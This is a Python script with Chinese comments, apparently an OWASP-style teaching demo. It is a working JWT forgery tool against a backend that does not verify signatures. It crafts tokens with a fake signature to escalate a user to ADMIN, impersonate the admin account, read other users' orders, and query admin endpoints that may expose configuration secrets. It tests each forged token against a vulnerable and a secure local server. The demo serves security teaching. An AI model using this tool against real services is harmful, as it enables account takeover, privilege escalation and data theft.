#!/usr/bin/env python3
"""
JWT Token 偽造攻擊腳本
======================
此腳本展示如何利用不驗證簽名的 JWT 實作進行 Token 偽造攻擊。

攻擊原理：
---------
漏洞版本的後端只解析 JWT 的 payload（Base64 解碼），
完全不驗證簽名。這意味著攻擊者可以：
1. 修改任意 claim（如 userId、role）
2. 使用任意或空的簽名
3. 冒充任何使用者或提升權限

作者：OWASP Demo
"""

import base64
import json
import requests
import argparse
from datetime import datetime, timedelta

# 配置
VULNERABLE_URL = "http://localhost:8081"
SECURE_URL = "http://localhost:8082"


def base64url_encode(data: bytes) -> str:
    """Base64 URL 編碼（無填充）"""
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('utf-8')


def base64url_decode(data: str) -> bytes:
    """Base64 URL 解碼"""
    # 補齊填充
    padding = 4 - len(data) % 4
    if padding != 4:
        data += '=' * padding
    return base64.urlsafe_b64decode(data)


def create_forged_token(user_id: int, username: str, role: str = "USER") -> str:
    """
    建立偽造的 JWT Token
    
    漏洞後端只檢查 payload，不驗證簽名，
    所以我們可以任意修改 payload 內容
    """
    # JWT Header（標準）
    header = {
        "alg": "HS256",
        "typ": "JWT"
    }
    
    # JWT Payload（偽造的使用者資訊）
    now = datetime.utcnow()
    payload = {
        "sub": username,
        "userId": user_id,
        "username": username,
        "role": role,
        "iat": int(now.timestamp()),
        "exp": int((now + timedelta(hours=24)).timestamp())
    }
    
    # 編碼 header 和 payload
    header_encoded = base64url_encode(json.dumps(header).encode())
    payload_encoded = base64url_encode(json.dumps(payload).encode())
    
    # 使用假的簽名（漏洞版本不會驗證）
    fake_signature = base64url_encode(b"FORGED_SIGNATURE_NOT_VERIFIED")
    
    # 組合成完整 token
    return f"{header_encoded}.{payload_encoded}.{fake_signature}"


def decode_jwt(token: str) -> dict:
    """解碼 JWT Token（不驗證）"""
    parts = token.split('.')
    if len(parts) != 3:
        raise ValueError("Invalid JWT format")
    
    header = json.loads(base64url_decode(parts[0]))
    payload = json.loads(base64url_decode(parts[1]))
    
    return {
        "header": header,
        "payload": payload,
        "signature": parts[2]
    }


def get_legitimate_token(username: str, password: str, url: str = VULNERABLE_URL) -> str:
    """取得合法的 JWT Token（透過正常登入）"""
    response = requests.post(
        f"{url}/api/auth/login",
        json={"username": username, "password": password}
    )
    
    if response.status_code == 200:
        return response.json().get("token")
    else:
        print(f"❌ 登入失敗: {response.status_code}")
        print(response.text)
        return None


def test_token(token: str, url: str = VULNERABLE_URL) -> bool:
    """測試 Token 是否有效"""
    response = requests.get(
        f"{url}/api/auth/me",
        headers={"Authorization": f"Bearer {token}"}
    )
    
    if response.status_code == 200:
        print(f"✅ Token 有效！使用者資訊：")
        print(json.dumps(response.json(), indent=2, ensure_ascii=False))
        return True
    else:
        print(f"❌ Token 無效: {response.status_code}")
        return False


def attack_privilege_escalation():
    """
    🔴 攻擊演示：權限提升
    以一般使用者登入，然後偽造 ADMIN 權限的 Token
    """
    print("\n" + "=" * 60)
    print("🔴 攻擊演示：權限提升（Privilege Escalation）")
    print("=" * 60)
    
    # 步驟 1：以一般使用者登入取得合法 Token
    print("\n📋 步驟 1：以一般使用者 'user' 登入...")
    legit_token = get_legitimate_token("user", "user123")
    
    if not legit_token:
        print("❌ 無法取得合法 Token")
        return
    
    print(f"✅ 取得合法 Token：{legit_token[:50]}...")
    decoded = decode_jwt(legit_token)
    print(f"   原始 role: {decoded['payload'].get('role')}")
    
    # 步驟 2：偽造 ADMIN 權限的 Token
    print("\n📋 步驟 2：偽造 ADMIN 權限的 Token...")
    forged_token = create_forged_token(
        user_id=decoded['payload'].get('userId', 2),
        username="user",
        role="ADMIN"  # 提升為 ADMIN
    )
    
    print(f"🔓 偽造 Token：{forged_token[:50]}...")
    forged_decoded = decode_jwt(forged_token)
    print(f"   偽造 role: {forged_decoded['payload'].get('role')}")
    
    # 步驟 3：測試偽造的 Token
    print("\n📋 步驟 3：使用偽造 Token 存取系統...")
    print("\n🎯 目標：漏洞版本 (http://localhost:8081)")
    test_token(forged_token, VULNERABLE_URL)
    
    print("\n🎯 目標：安全版本 (http://localhost:8082)")
    test_token(forged_token, SECURE_URL)


def attack_user_impersonation(target_user_id: int = 1, target_username: str = "admin"):
    """
    🔴 攻擊演示：使用者冒充
    偽造其他使用者的 Token 來存取他們的資料
    """
    print("\n" + "=" * 60)
    print(f"🔴 攻擊演示：冒充使用者 '{target_username}' (ID: {target_user_id})")
    print("=" * 60)
    
    # 偽造目標使用者的 Token
    print(f"\n📋 偽造 {target_username} 的 Token...")
    forged_token = create_forged_token(
        user_id=target_user_id,
        username=target_username,
        role="ADMIN" if target_username == "admin" else "USER"
    )
    
    print(f"🔓 偽造 Token：{forged_token[:50]}...")
    
    # 測試存取
    print("\n📋 使用偽造 Token 存取目標使用者的資料...")
    print("\n🎯 漏洞版本 - 存取 /api/auth/me:")
    test_token(forged_token, VULNERABLE_URL)
    
    # 嘗試存取訂單
    print("\n🎯 漏洞版本 - 存取目標使用者的訂單:")
    response = requests.get(
        f"{VULNERABLE_URL}/api/orders/my",
        headers={"Authorization": f"Bearer {forged_token}"}
    )
    if response.status_code == 200:
        orders = response.json()
        print(f"✅ 成功取得 {len(orders)} 筆訂單！")
        for order in orders[:3]:  # 只顯示前三筆
            print(f"   - 訂單 {order.get('orderNumber')}: ${order.get('totalAmount')}")
    else:
        print(f"❌ 存取失敗: {response.status_code}")


def attack_admin_access():
    """
    🔴 攻擊演示：存取管理員功能
    偽造 ADMIN Token 來存取管理員 API
    """
    print("\n" + "=" * 60)
    print("🔴 攻擊演示：存取管理員功能")
    print("=" * 60)
    
    # 偽造 ADMIN Token
    forged_token = create_forged_token(
        user_id=999,  # 不存在的使用者
        username="hacker",
        role="ADMIN"
    )
    
    print(f"\n📋 偽造 ADMIN Token...")
    print(f"🔓 偽造 Token：{forged_token[:50]}...")
    
    # 嘗試存取管理員 API
    admin_endpoints = [
        "/api/admin/users",
        "/api/admin/stats",
        "/api/admin/config"
    ]
    
    print("\n🎯 漏洞版本 - 存取管理員端點:")
    for endpoint in admin_endpoints:
        response = requests.get(
            f"{VULNERABLE_URL}{endpoint}",
            headers={"Authorization": f"Bearer {forged_token}"}
        )
        if response.status_code == 200:
            print(f"✅ {endpoint}: 存取成功！")
            data = response.json()
            if "config" in endpoint and "database" in str(data):
                print(f"   ⚠️ 洩露敏感資訊：資料庫密碼等...")
        else:
            print(f"❌ {endpoint}: {response.status_code}")
    
    print("\n🎯 安全版本 - 存取管理員端點:")
    for endpoint in admin_endpoints:
        response = requests.get(
            f"{SECURE_URL}{endpoint}",
            headers={"Authorization": f"Bearer {forged_token}"}
        )
        if response.status_code == 200:
            print(f"✅ {endpoint}: 存取成功！")
        else:
            print(f"❌ {endpoint}: {response.status_code} (被阻擋)")


def compare_tokens():
    """比較合法 Token 與偽造 Token 的差異"""
    print("\n" + "=" * 60)
    print("📊 Token 比較分析")
    print("=" * 60)
    
    # 取得合法 Token
    legit_token = get_legitimate_token("user", "user123")
    if not legit_token:
        return
    
    # 建立偽造 Token
    forged_token = create_forged_token(2, "user", "ADMIN")
    
    print("\n📋 合法 Token 結構：")
    legit_decoded = decode_jwt(legit_token)
    print(f"   Header:    {json.dumps(legit_decoded['header'])}")
    print(f"   Payload:   {json.dumps(legit_decoded['payload'], indent=14)}")
    print(f"   Signature: {legit_decoded['signature'][:30]}...")
    
    print("\n📋 偽造 Token 結構：")
    forged_decoded = decode_jwt(forged_token)
    print(f"   Header:    {json.dumps(forged_decoded['header'])}")
    print(f"   Payload:   {json.dumps(forged_decoded['payload'], indent=14)}")
    print(f"   Signature: {forged_decoded['signature'][:30]}... (偽造)")
    
    print("\n⚠️ 注意：偽造 Token 的簽名是假的，")
    print("   但漏洞版本只解碼 payload，不驗證簽名，所以仍然有效！")


def main():
    parser = argparse.ArgumentParser(
        description="JWT Token 偽造攻擊工具",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
範例：
  python jwt_forge.py --attack privilege     # 權限提升攻擊
  python jwt_forge.py --attack impersonate   # 冒充使用者攻擊
  python jwt_forge.py --attack admin         # 存取管理員功能
  python jwt_forge.py --attack all           # 執行所有攻擊
  python jwt_forge.py --compare              # 比較 Token 差異
        """
    )
    
    parser.add_argument(
        "--attack", 
        choices=["privilege", "impersonate", "admin", "all"],
        help="執行的攻擊類型"
    )
    parser.add_argument(
        "--compare",
        action="store_true",
        help="比較合法與偽造 Token"
    )
    parser.add_argument(
        "--target-user",
        type=int,
        default=1,
        help="冒充攻擊的目標使用者 ID（預設：1=admin）"
    )
    parser.add_argument(
        "--target-username",
        default="admin",
        help="冒充攻擊的目標使用者名稱（預設：admin）"
    )
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("🔐 JWT Token 偽造攻擊工具")
    print("=" * 60)
    print(f"⚠️ 此工具僅供教育目的！請勿用於非法活動。")
    print(f"📍 漏洞目標：{VULNERABLE_URL}")
    print(f"📍 安全目標：{SECURE_URL}")
    
    if args.compare:
        compare_tokens()
    elif args.attack == "privilege":
        attack_privilege_escalation()
    elif args.attack == "impersonate":
        attack_user_impersonation(args.target_user, args.target_username)
    elif args.attack == "admin":
        attack_admin_access()
    elif args.attack == "all":
        attack_privilege_escalation()
        attack_user_impersonation()
        attack_admin_access()
    else:
        parser.print_help()
        print("\n💡 快速開始：python jwt_forge.py --attack all")


if __name__ == "__main__":
    main()
